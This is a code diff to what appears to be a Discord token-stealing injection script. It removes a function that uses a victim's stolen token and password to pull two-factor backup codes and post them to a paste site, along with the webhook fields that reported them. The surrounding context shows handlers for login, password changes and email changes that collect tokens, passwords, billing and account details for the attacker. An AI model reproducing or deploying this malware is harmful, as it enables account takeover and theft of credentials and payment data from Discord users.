@@ -19,11 +19,6 @@ const config = {
   injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
-  bin: "https://dpaste.com/api/",
-  url_regex: new RegExp(
-    "(http(s)?:\\/\\/.)?(www\\.)?dpaste\\.[a-z]{2,6}\\b([-a-zA-Z0-9@:%_\\+.~#?&//=]*)",
-    "g",
-  ),
   nitro: {
     boost: {
       year: {
@@ -173,14 +168,6 @@ const execScript = (script) => {
   return window.webContents.executeJavaScript(script, !0);
 };
 
-const dpaste = async (content) => {
-  return await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "${config.bin}", false);
-    xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xmlHttp.send('content=${encodeURIComponent(content)}&expiry_days=30');
-    xmlHttp.responseText;`);
-};
-
 const getInfo = async (token) => {
   const info = await execScript(`var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("GET", "${config.api}", false);
@@ -188,23 +175,6 @@ const getInfo = async (token) => {
     xmlHttp.send(null);
     xmlHttp.responseText;`);
   return JSON.parse(info);
-};
-
-const getMfa = async (password, token) => {
-  if (!token.startsWith("mfa.")) return "N/A";
-  let content = "";
-  const mfa = await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "${config.api}/mfa/codes", false);
-    xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send(JSON.stringify(${JSON.stringify({ password: password, regenerate: false })}));
-    xmlHttp.responseText
-    `);
-  const codes = JSON.parse(mfa).backup_codes;
-  for (const i in codes) {
-    content += `${codes[i].code} ⋮ ${codes[i].consumed ? "used" : "not used"}\n`;
-  }
-  return await dpaste(content);
 };
 
 const fetchBilling = async (token) => {
@@ -358,7 +328,6 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
-  const mfa = await getMfa(password, token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -373,9 +342,7 @@ const login = async (email, password, token) => {
           },
           {
             name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: ${
-              mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
-            }`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
@@ -403,7 +370,6 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
-  const mfa = await getMfa(newpassword, token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -418,9 +384,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
           {
             name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: ${
-              mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
-            }`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
@@ -448,7 +412,6 @@ const emailChanged = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
-  const mfa = await getMfa(password, token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -463,9 +426,7 @@ const emailChanged = async (email, password, token) => {
           },
           {
             name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: ${
-              mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
-            }`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
